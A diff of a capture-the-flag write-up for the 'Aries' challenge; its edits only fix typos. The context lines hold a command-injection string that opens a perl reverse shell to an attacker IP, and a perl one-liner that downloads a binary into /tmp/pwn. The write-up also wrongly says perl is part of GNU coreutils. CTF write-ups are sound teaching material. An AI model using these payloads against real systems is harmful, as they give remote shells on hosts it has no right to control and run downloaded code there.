@@ -83,7 +83,7 @@ These are basically the same files we encountered during the other challenges, e
 We have one new file *proxy.py*, this service listens on port 5000 and emulates the only one connection per request behaviour of the satellite challenge. On the remote this will also be different and actually upload the payload to the satellite and returns its response. 
 [*proxy.py*](https://gfelber.dev/writeups/res/aries/proxy.py) 
 
-The files that changed are the *Dockerfile* and *init* inside the *rootfs.cpio.gz*. Notably Dockerfile now adds a tap interface (eth1 inside the vm) and setups firewall rules. It also starts the proxy. This will force use to do the Privilege Escalation in Sheratan, as otherwise we won't be able to communicate with the proxy and reach the final part: Mesarthim.
+The files that changed are the *Dockerfile* and *init* inside the *rootfs.cpio.gz*. Notably Dockerfile now adds a tap interface (eth1 inside the vm) and setups firewall rules. It also starts the proxy. This will force us to do the Privilege Escalation in Sheratan, as otherwise we won't be able to communicate with the proxy and reach the final part: Mesarthim.
 
 [*Dockerfile*](https://gfelber.dev/writeups/res/aries/Dockerfile) [*init*](https://gfelber.dev/writeups/res/aries/init)
 
@@ -92,7 +92,7 @@ Also it is important to note that we will now have to exploit Hamal on a read on
 
 ## Exploitation
 
-Instead of copying the flag to a exposed directory in Hamal, this time we will have to open a reverse shell. Luckily for use the `perl` is part of GNU coreutils and preinstalled on the system. So we have access to a whole programming language to write our reverse shell:
+Instead of copying the flag to a exposed directory in Hamal, this time we will have to open a reverse shell. Luckily `perl` is part of GNU coreutils and preinstalled on the system. So we have access to a whole programming language to write our reverse shell:
 
 ```perl
 use Socket;
@@ -123,7 +123,7 @@ REV_PORT = 1234
 CMD = """; nohup perl -e 'use Socket;$i="REPLACE_ME_IP";$p=REPLACE_ME_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){if(!defined(fileno(STDIN))||!defined(fileno(STDOUT))||!defined(fileno(STDERR))){open(STDIN,">/dev/null");open(STDOUT,">/dev/null");open(STDERR,">/dev/null");}open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'&""".replace("REPLACE_ME_IP", REV_IP).replace("REPLACE_ME_PORT", str(REV_PORT))
 ```
 
-After achieving persistence we can use some more perl scripts to download the binary and execute it for the `Sheratan part`
+After achieving persistence we can use some more perl scripts to download the binary and execute it for the *Sheratan* part
 
 ```bash
 perl -MIO::Socket::INET -e '$h=shift;$r=shift;$o=shift||"out";$s=IO::Socket::INET->new("$h") or die$!;print $s "GET $r HTTP/1.0\r\nHost: $h\r\nConnection: close\r\n\r\n";undef $/;$_=<$s>;s/\A.*?\r?\n\r?\n//s;open F,">",$o or die$!;binmode F;print F $_' 10.13.13.1:1235 pwn /tmp/pwn
